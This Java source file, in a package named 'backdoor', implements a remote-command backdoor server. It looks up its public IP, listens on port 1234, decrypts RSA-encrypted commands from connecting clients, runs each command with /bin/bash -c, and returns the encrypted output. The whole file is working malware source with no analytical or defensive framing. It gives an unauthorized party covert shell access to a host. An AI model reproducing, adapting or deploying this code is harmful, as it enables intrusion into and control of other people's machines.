package backdoor.java;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.BufferedReader;
import java.io.Closeable;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;

import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.HttpURLConnection;

import java.util.ArrayList;
import java.util.logging.Logger;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.EncodedKeySpec;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;

import java.util.Base64;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;


public class Server {
    
    public static void main(String[] args) throws IOException {

        // final int PORT = Integer.parseInt(args[0]);
         final int PORT = 1234;

        URL url_name = new URL("http://checkip.amazonaws.com");
        HttpURLConnection conection = (HttpURLConnection) url_name.openConnection();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(conection.getInputStream()));
        File publicKeyFile = new File("publicKeyFile.txt");
        File privateKeyFile = new File("privateKeyFile.txt"); 
        
        ServerSocket server = new ServerSocket(PORT);
        System.out.println("\nServidor iniciado: " + bufferedReader.readLine() + ": " + PORT);
        bufferedReader.close();

        while(true){
            
            try{
        
                Socket client = server.accept();
                System.out.println("Client conectado: " + client.getInetAddress().getHostAddress() + "\n");
            
                ObjectOutputStream outputStream = new ObjectOutputStream(client.getOutputStream());
        
                Thread thread = new Thread(() -> {

                    try {
            
                        ObjectInputStream inputStream = new ObjectInputStream(client.getInputStream());
                        
                        while(client.isConnected()){
                            
                            String decodedCommand = Cryptography.decryptMesage((String)inputStream.readObject(), privateKeyFile);
                            System.out.println("Client: " + decodedCommand + "\n");
                            
                            String log = Eval.executeCommand(decodedCommand);
                            String encodedMessage = Cryptography.encryptMessage(log, publicKeyFile);
                            
                            try {
                                outputStream.writeObject(encodedMessage);    
                            } catch (Exception exception) {
                                exception.printStackTrace();
                            }
            
                            if("exit".equals(decodedCommand)) {
            
                                System.out.println("Cliente desconectado!\n");
                                
                                inputStream.close();
                                outputStream.flush();
                                client.close();
                                
                                break;
                            }
            
                        }
                    }
                    catch(Exception exception) { exception.printStackTrace(); }                    

                }, "client");
                thread.start();


                outputStream.writeObject(Cryptography.encryptMessage("\nHello from Server!\n", publicKeyFile));
                
            } catch (Exception exception){ exception.printStackTrace(); break; }
        }

        server.close();

    }

}

class Eval {

    private static final Logger log = Logger.getLogger(Eval.class.getName());

    public static String executeCommand(final String command) throws IOException {

        final ArrayList<String> commands = new ArrayList<String>();
        commands.add("/bin/bash");
        commands.add("-c");
        commands.add(command);

        BufferedReader bufferedReader = null;
        String logBuffer = "";

        try {
        
            final ProcessBuilder processBuilder = new ProcessBuilder(commands);
            final Process process = processBuilder.start();
            final InputStream inputStream = process.getInputStream();
            final InputStreamReader inputStreamReader = new InputStreamReader(inputStream);

            bufferedReader = new BufferedReader(inputStreamReader);

            String line;
            while((line = bufferedReader.readLine()) != null) { logBuffer += line + "\n"; }
            System.out.println(logBuffer);
            return logBuffer;
        
        } catch (IOException ioException){
        
            log.severe("Erro ao executar o comando shell: " + ioException.getMessage());
            throw ioException;
        
        } finally { secureClose(bufferedReader); }
    }

    private static void secureClose(final Closeable resource){
        try{
            if(resource != null){
                resource.close();
            }
        } catch (IOException ioException){
            log.severe("Erro: " + ioException.getMessage());
        }
    }

}

class Cryptography {
    
    public static void createRSAKeys(File publicKeyFile, File privateKeyFile)
    throws NoSuchAlgorithmException, FileNotFoundException, IOException {

        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        KeyPair pair = generator.genKeyPair();
        
        try(FileOutputStream fileOutputStream = new FileOutputStream(publicKeyFile)){
            fileOutputStream.write(pair.getPublic().getEncoded());
        }
        
        try(FileOutputStream fileOutputStream = new FileOutputStream(privateKeyFile)){
            fileOutputStream.write(pair.getPrivate().getEncoded());
        }

    }

    public static PublicKey readRSAPublicKey(File KeyFile) 
    throws IOException, NoSuchAlgorithmException, InvalidKeySpecException {

        byte[] publicKeyBytes = Files.readAllBytes(KeyFile.toPath());
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(publicKeyBytes);
        return keyFactory.generatePublic(publicKeySpec);

    }

    public static PrivateKey readRSAPrivateKey(File KeyFile)
    throws NoSuchAlgorithmException, IOException, InvalidKeySpecException {

        byte[] privateKeyBytes = Files.readAllBytes(KeyFile.toPath());
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(privateKeyBytes);
        return keyFactory.generatePrivate(privateKeySpec);

    }

    public static String encryptMessage(String message, File publicKeyFile) 
    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {

        Cipher encryptCipher = Cipher.getInstance("RSA");
        encryptCipher.init(Cipher.ENCRYPT_MODE, readRSAPublicKey(publicKeyFile));
        byte[] messageBytes = message.getBytes(StandardCharsets.UTF_8);
        byte[] encryptMessageBytes = encryptCipher.doFinal(messageBytes);
        return Base64.getEncoder().encodeToString(encryptMessageBytes);

    }


    public static String decryptMesage(String encryptMessage, File privateKeyFile)
    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {

        Cipher decryptCipher = Cipher.getInstance("RSA");
        decryptCipher.init(Cipher.DECRYPT_MODE, readRSAPrivateKey(privateKeyFile));
        byte[] decryptMessageBytes = decryptCipher.doFinal(Base64.getDecoder().decode(encryptMessage));
        return new String(decryptMessageBytes, StandardCharsets.UTF_8);

    }

    public static String hashMessage(String message) throws NoSuchAlgorithmException{
        
        final MessageDigest digest = MessageDigest.getInstance("SHA3-256");
        final byte[] hashBytes = digest.digest(message.getBytes(StandardCharsets.UTF_8));
        return bytesToHex(hashBytes);
    
    }

    private static String bytesToHex(byte[] hash){

        StringBuilder hexString = new StringBuilder(2 * hash.length);
        for (byte b : hash){
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1){
                hexString.append('0');
            }
            hexString.append(hex);
        }
        return hexString.toString();

    }

}
